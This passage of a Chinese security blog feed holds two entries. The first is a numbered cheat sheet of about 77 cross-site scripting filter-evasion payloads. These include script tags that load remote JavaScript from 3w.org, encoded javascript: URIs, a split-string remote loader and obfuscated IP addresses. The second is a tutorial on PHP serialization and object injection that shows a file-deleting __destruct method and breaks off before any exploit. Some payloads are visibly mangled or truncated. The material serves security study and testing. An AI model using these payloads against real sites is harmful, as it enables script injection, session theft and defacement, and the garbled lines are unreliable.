class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div></pre></td><td class="code"><pre><div class="line">(1)普通的XSS JavaScript注入</div><div class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(2)IMG标签XSS使用JavaScript命令</div><div class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(3)IMG标签无分号无引号</div><div class="line">&lt;IMG SRC=javascript:alert(‘XSS’)&gt;</div><div class="line"></div><div class="line">(4)IMG标签大小写不敏感</div><div class="line">&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;</div><div class="line"></div><div class="line">(5)HTML编码(必须有分号)</div><div class="line">&lt;IMG SRC=javascript:alert(“XSS”)&gt;</div><div class="line"></div><div class="line">(6)修正缺陷IMG标签</div><div class="line">&lt;IMG “”&quot;&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;</div><div class="line"></div><div class="line">(7)formCharCode标签(计算器)</div><div class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</div><div class="line"></div><div class="line">(8)UTF-8的Unicode编码(计算器)</div><div class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</div><div class="line"></div><div class="line">(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</div><div class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</div><div class="line"></div><div class="line">(10)十六进制编码也是没有分号(计算器)</div><div class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</div><div class="line"></div><div class="line">(11)嵌入式标签,将Javascript分开</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(12)嵌入式编码标签,将Javascript分开</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(13)嵌入式换行符</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(14)嵌入式回车</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(15)嵌入式多行注入JavaScript,这是XSS极端的例子</div><div class="line">&lt;IMG SRC=”javascript:alert(‘XSS‘)”&gt;</div><div class="line"></div><div class="line">(16)解决限制字符(要求同页面)</div><div class="line">&lt;script&gt;z=’document.’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’write(“‘&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’w.shell’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’.net/1.’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt;</div><div class="line">&lt;script&gt;eval_r(z)&lt;/script&gt;</div><div class="line"></div><div class="line">(17)空字符</div><div class="line">perl -e ‘print “&lt;IMG SRC=java\0script:alert(\”XSS\”)&gt;”;’ &gt; out</div><div class="line"></div><div class="line">(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</div><div class="line">perl -e ‘print “&lt;SCR\0IPT&gt;alert(\”XSS\”)&lt;/SCR\0IPT&gt;”;’ &gt; out</div><div class="line"></div><div class="line">(19)Spaces和meta前的IMG标签</div><div class="line">&lt;IMG SRC=”   javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(20)Non-alpha-non-digit XSS</div><div class="line">&lt;SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(21)Non-alpha-non-digit XSS to 2</div><div class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt;</div><div class="line"></div><div class="line">(22)Non-alpha-non-digit XSS to 3</div><div class="line">&lt;SCRIPT/SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(23)双开括号</div><div class="line">&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(24)无结束脚本标记(仅火狐等浏览器)</div><div class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</div><div class="line"></div><div class="line">(25)无结束脚本标记2</div><div class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</div><div class="line"></div><div class="line">(26)半开的HTML/JavaScript XSS</div><div class="line">&lt;IMG SRC=”javascript:alert(‘XSS’)”</div><div class="line"></div><div class="line">(27)双开角括号</div><div class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</div><div class="line"></div><div class="line">(28)无单引号 双引号 分号</div><div class="line">&lt;SCRIPT&gt;a=/XSS/</div><div class="line">alert(a.source)&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(29)换码过滤的JavaScript</div><div class="line">\”;alert(‘XSS’);//</div><div class="line"></div><div class="line">(30)结束Title标签</div><div class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(31)Input Image</div><div class="line">&lt;INPUT SRC=”javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(32)BODY Image</div><div class="line">&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(33)BODY标签</div><div class="line">&lt;BODY(‘XSS’)&gt;</div><div class="line"></div><div class="line">(34)IMG Dynsrc</div><div class="line">&lt;IMG DYNSRC=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(35)IMG Lowsrc</div><div class="line">&lt;IMG LOWSRC=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(36)BGSOUND</div><div class="line">&lt;BGSOUND SRC=”javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(37)STYLE sheet</div><div class="line">&lt;LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(38)远程样式表</div><div class="line">&lt;LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”&gt;</div><div class="line"></div><div class="line">(39)List-style-image(列表式)</div><div class="line">&lt;STYLE&gt;li &#123;list-style-image: url(“javascript:alert(‘XSS’)”);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</div><div class="line"></div><div class="line">(40)IMG VBscript</div><div class="line">&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</div><div class="line"></div><div class="line">(41)META链接url</div><div class="line">&lt;META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(42)Iframe</div><div class="line">&lt;IFRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/IFRAME&gt;</div><div class="line"></div><div class="line">(43)Frame</div><div class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/FRAMESET&gt;</div><div class="line"></div><div class="line">(44)Table</div><div class="line">&lt;TABLE BACKGROUND=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(45)TD</div><div class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(46)DIV background-image</div><div class="line">&lt;DIV STYLE=”background-image: none)”&gt;</div><div class="line"></div><div class="line">(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)</div><div class="line">&lt;DIV STYLE=”background-image: none)”&gt;</div><div class="line"></div><div class="line">(48)DIV expression</div><div class="line">&lt;DIV STYLE=”width: expression_r(alert(‘XSS’));”&gt;</div><div class="line"></div><div class="line">(49)STYLE属性分拆表达</div><div class="line">&lt;IMG STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</div><div class="line"></div><div class="line">(50)匿名STYLE(组成:开角号和一个字母开头)</div><div class="line">&lt;XSS STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</div><div class="line"></div><div class="line">(51)STYLE background-image</div><div class="line">&lt;STYLE&gt;.XSS&#123;background-image:none”);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;</div><div class="line"></div><div class="line">(52)IMG STYLE方式</div><div class="line">exppression(alert(“XSS”))’&gt;</div><div class="line"></div><div class="line">(53)STYLE background</div><div class="line">&lt;STYLE&gt;&lt;STYLE type=”text/css”&gt;BODY&#123;background:url(“javascript:alert(‘XSS’)”)&#125;&lt;/STYLE&gt;</div><div class="line"></div><div class="line">(54)BASE</div><div class="line">&lt;BASE HREF=”javascript:alert(‘XSS’);//”&gt;</div><div class="line"></div><div class="line">(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS</div><div class="line">&lt;EMBED SRC=”http://3w.org/XSS/xss.swf” &gt;&lt;/EMBED&gt;</div><div class="line"></div><div class="line">(56)在flash中使用ActionScrpt可以混进你XSS的代码</div><div class="line">a=”get”;</div><div class="line">b=”URL(\”&quot;;</div><div class="line">c=”javascript:”;</div><div class="line">d=”alert(‘XSS’);\”)”;</div><div class="line">eval_r(a+b+c+d);</div><div class="line"></div><div class="line">(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上</div><div class="line">&lt;HTML xmlns:xss&gt;</div><div class="line">&lt;?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”&gt;</div><div class="line">&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;</div><div class="line">&lt;/HTML&gt;</div><div class="line"></div><div class="line">(58)如果过滤了你的JS你可以在图片里添加JS代码来利用</div><div class="line">&lt;SCRIPT SRC=””&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(59)IMG嵌入式命令,可执行任意命令</div><div class="line">&lt;IMG SRC=”http://www.XXX.com/a.php?a=b”&gt;</div><div class="line"></div><div class="line">(60)IMG嵌入式命令(a.jpg在同服务器)</div><div class="line">Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser</div><div class="line"></div><div class="line">(61)绕符号过滤</div><div class="line">&lt;SCRIPT a=”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(62)</div><div class="line">&lt;SCRIPT =”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(63)</div><div class="line">&lt;SCRIPT a=”&gt;” ” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(64)</div><div class="line">&lt;SCRIPT “a=’&gt;’” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(65)</div><div class="line">&lt;SCRIPT a=`&gt;` SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(66)</div><div class="line">&lt;SCRIPT a=”&gt;’&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(67)</div><div class="line">&lt;SCRIPT&gt;document.write(“&lt;SCRI”);&lt;/SCRIPT&gt;PT SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(68)URL绕行</div><div class="line">&lt;A HREF=”http://127.0.0.1/”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(69)URL编码</div><div class="line">&lt;A HREF=”http://3w.org”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(70)IP十进制</div><div class="line">&lt;A HREF=”http://3232235521″&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(71)IP十六进制</div><div class="line">&lt;A HREF=”http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(72)IP八进制</div><div class="line">&lt;A HREF=”http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(73)混合编码</div><div class="line">&lt;A HREF=”h</div><div class="line">tt p://6 6.000146.0×7.147/”&quot;&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(74)节省[http:]</div><div class="line">&lt;A HREF=”//www.google.com/”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(75)节省[www]</div><div class="line">&lt;A HREF=”http://google.com/”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(76)绝对点绝对DNS</div><div class="line">&lt;A HREF=”http://www.google.com./”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(77)javascript链接</div><div class="line">&lt;A HREF=”javascript:document.location=’http://www.google.com/’”&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>理解php序列化漏洞</title>
    <link href="http://uknowsec.cn/posts/notes/%E7%90%86%E8%A7%A3php%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html"/>
    <id>http://uknowsec.cn/posts/notes/理解php序列化漏洞.html</id>
    <published>2017-07-11T03:22:05.000Z</published>
    <updated>2017-07-11T05:41:55.169Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<p>PHP对象注入是一个非常常见的漏洞，这个类型的漏洞虽然有些难以利用，但仍旧非常危险。为了理解这个漏洞，请读者具备基础的php知识。类和变量是非常容易理解的php概念。举个例子，1.php在一个类中定义了一个变量和一个方法。它创建了一个对象并且调用了PrintVariable函数，该函数会输出变量variable。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">   </div><div class="line">class TestClass  </div><div class="line">&#123;  </div><div class="line">    // 一个变量  </div><div class="line">   </div><div class="line">    public $variable = &apos;This is a string&apos;;  </div><div class="line">   </div><div class="line">    // 一个简单的方法  </div><div class="line">   </div><div class="line">    public function PrintVariable()  </div><div class="line">    &#123;  </div><div class="line">        echo $this-&gt;variable;  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">// 创建一个对象  </div><div class="line">   </div><div class="line">$object = new TestClass();  </div><div class="line">   </div><div class="line">// 调用一个方法  </div><div class="line">   </div><div class="line">$object-&gt;PrintVariable();  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161225214524536" alt=""></p>
<p>php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号<strong>开头的，比如 </strong>construct, <strong>destruct, </strong>toString, <strong>sleep, </strong>wakeup等等。这些函数在某些情况下会自动调用，比如<strong>construct当一个对象创建时被调用，</strong>destruct当一个对象销毁时被调用，<strong>toString当一个对象被当作一个字符串使用。为了更好的理解magic方法是如何工作的，在2.php中增加了三个magic方法，</strong>construct, <strong>destruct和</strong>toString。可以看出，<strong>construct在对象创建时调用，</strong>destruct在php脚本结束时调用，__toString在对象被当作一个字符串使用时调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">   </div><div class="line">class TestClass  </div><div class="line">&#123;  </div><div class="line">    // 一个变量  </div><div class="line">   </div><div class="line">    public $variable = &apos;This is a string&apos;;  </div><div class="line">   </div><div class="line">    // 一个简单的方法  </div><div class="line">   </div><div class="line">    public function PrintVariable()  </div><div class="line">    &#123;  </div><div class="line">        echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    // Constructor  </div><div class="line">   </div><div class="line">    public function __construct()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__construct &lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    // Destructor  </div><div class="line">   </div><div class="line">    public function __destruct()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__destruct &lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    // Call  </div><div class="line">   </div><div class="line">    public function __toString()  </div><div class="line">    &#123;  </div><div class="line">        return &apos;__toString&lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">// 创建一个对象  </div><div class="line">//  __construct会被调用  </div><div class="line">   </div><div class="line">$object = new TestClass();  </div><div class="line">   </div><div class="line">// 创建一个方法   </div><div class="line">   </div><div class="line">$object-&gt;PrintVariable();  </div><div class="line">   </div><div class="line">// 对象被当作一个字符串  </div><div class="line">//  __toString会被调用  </div><div class="line">   </div><div class="line">echo $object;  </div><div class="line">   </div><div class="line">// End of PHP script  </div><div class="line">// 脚本结束__destruct会被调用  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226145426730" alt=""></p>
<p>php允许保存一个对象方便以后重用，这个过程被称为序列化。为什么要有序列化这种机制呢?在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。试想，如果为一个脚本中想要调用之前一个脚本的变量，但是前一个脚本已经执行完毕，所有的变量和内容释放掉了，我们要如何操作呢?难道要前一个脚本不断的循环，等待后面脚本调用?这肯定是不现实的。serialize和unserialize就是用来解决这一问题的。serialize可以将变量转换为字符串并且在转换中可以保存当前变量的值；unserialize则可以将serialize生成的字符串变换回变量。让我们在3.php中添加序列化的例子，看看php对象序列化之后的格式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">&lt;?php    </div><div class="line">     </div><div class="line">// 某类    </div><div class="line">     </div><div class="line">class User    </div><div class="line">&#123;    </div><div class="line">    // 类数据    </div><div class="line">     </div><div class="line">    public $age = 0;    </div><div class="line">    public $name = &apos;&apos;;    </div><div class="line">     </div><div class="line">    // 输出数据    </div><div class="line">     </div><div class="line">    public function PrintData()    </div><div class="line">    &#123;    </div><div class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age    </div><div class="line">             . &apos; years old. &lt;br /&gt;&apos;;    </div><div class="line">    &#125;    </div><div class="line">&#125;    </div><div class="line">     </div><div class="line">// 创建一个对象    </div><div class="line">     </div><div class="line">$usr = new User();    </div><div class="line">     </div><div class="line">// 设置数据    </div><div class="line">     </div><div class="line">$usr-&gt;age = 20;    </div><div class="line">$usr-&gt;name = &apos;John&apos;;    </div><div class="line">     </div><div class="line">// 输出数据    </div><div class="line">     </div><div class="line">$usr-&gt;PrintData();    </div><div class="line">     </div><div class="line">// 输出序列化之后的数据    </div><div class="line">     </div><div class="line">echo serialize($usr);    </div><div class="line">     </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226151805778" alt=""></p>
<p>为了使用这个对象，在4.php中用unserialize重建对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;?php    </div><div class="line">     </div><div class="line">// 某类    </div><div class="line">     </div><div class="line">class User    </div><div class="line">&#123;    </div><div class="line">    // Class data    </div><div class="line">     </div><div class="line">    public $age = 0;    </div><div class="line">    public $name = &apos;&apos;;    </div><div class="line">     </div><div class="line">    // Print data    </div><div class="line">     </div><div class="line">    public function PrintData()    </div><div class="line">    &#123;    </div><div class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;    </div><div class="line">    &#125;    </div><div class="line">&#125;    </div><div class="line">     </div><div class="line">// 重建对象    </div><div class="line">     </div><div class="line">$usr = unserialize(&apos;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;&#125;&apos;);    </div><div class="line">     </div><div class="line">// 调用PrintData 输出数据    </div><div class="line">     </div><div class="line">$usr-&gt;PrintData();    </div><div class="line">     </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226152046329" alt=""></p>
<p>magic函数<strong>construct和</strong>destruct会在对象创建或者销毁时自动调用；<strong>sleep magic方法在一个对象被序列化的时候调用；</strong>wakeup magic方法在一个对象被反序列化的时候调用。在5.php中添加这几个magic函数的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">   </div><div class="line">class Test  </div><div class="line">&#123;  </div><div class="line">    public $variable = &apos;BUZZ&apos;;  </div><div class="line">    public $variable2 = &apos;OTHER&apos;;  </div><div class="line">   </div><div class="line">    public function PrintVariable()  </div><div class="line">    &#123;  </div><div class="line">        echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    public function __construct()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__construct&lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    public function __destruct()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__destruct&lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    public function __wakeup()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__wakeup&lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    public function __sleep()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__sleep&lt;br /&gt;&apos;;  </div><div class="line">   </div><div class="line">        return array(&apos;variable&apos;, &apos;variable2&apos;);  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">// 创建对象调用__construct</div><div class="line">   </div><div class="line">$obj = new Test();  </div><div class="line">   </div><div class="line">// 序列化对象调用__sleep  </div><div class="line">   </div><div class="line">$serialized = serialize($obj);  </div><div class="line">   </div><div class="line">// 输出序列化后的字符串  </div><div class="line">   </div><div class="line">print &apos;Serialized: &apos; . $serialized . &apos;&lt;br /&gt;&apos;;  </div><div class="line">   </div><div class="line">// 重建对象调用__wakeup  </div><div class="line">   </div><div class="line">$obj2 = unserialize($serialized);  </div><div class="line">   </div><div class="line">// 调用PintVariable输出数据 </div><div class="line">   </div><div class="line">$obj2-&gt;PrintVariable();  </div><div class="line">   </div><div class="line">// 脚本结束调用__destruct   </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226163434517" alt=""></p>
<p>现在我们了解序列化是如何工作的，但是我们如何利用它呢?有多种可能的方法，取决于应用程序、可用的类和magic函数。记住，序列化对象包含攻击者控制的对象值。你可能在Web应用程序源代码中找到一个定义<strong>wakeup或</strong>destruct的类，这些函数会影响Web应用程序。例如，我们可能会找到一个临时将日志存储到文件中的类。当销毁时对象可能不再需要日志文件并将其删除。把下面这段代码保存为logfile.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;?php   </div><div class="line">   </div><div class="line">class LogFile  </div><div class="line">&#123;  </div><div class="line">    // log文件名  </div><div class="line">   </div><div class="line">    public $filename = &apos;error.log&apos;;  </div><div class="line">   </div><div class="line">    // 储存日志文件  </div><div class="line">   </div><div class="line">    public function LogData($text)  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;Log some data: &apos; . $text . &apos;&lt;br /&gt;&apos;;  </div><div class="line">        file_put_contents($this-&gt;filename, $text, FILE_APPEND);  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    // 删除日志文件  </div><div class="line">   </div><div class="line">    public function __destruct()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__destruct deletes &quot;&apos; . $this-&gt;filename . &apos;&quot; file. &lt;br /&gt;&apos;;  </div><div class="line">        unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;filename);  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>这是一个使用它的例子。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php    </div><div class="line">     </div><div class="line">include &apos;logfile.php&apos;;    </div><div class="line">     </div><div class="line">// 创建一个对象    </div><div class="line">     </div><div class="line">$obj = new LogFile();    </div><div class="line">     </div><div class="line">// 设置文件名和要储存的日志数据    </div><div class="line">     </div><div class="line">$obj-&gt;filename = &apos;somefile.log&apos;;    </div><div class="line">$obj-&gt;LogData(&apos;Test&apos;);    </div><div class="line">     </div><div class="line">// 脚本结束__destruct被调用somefile.log文件被删除  </div><div class="line">     </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
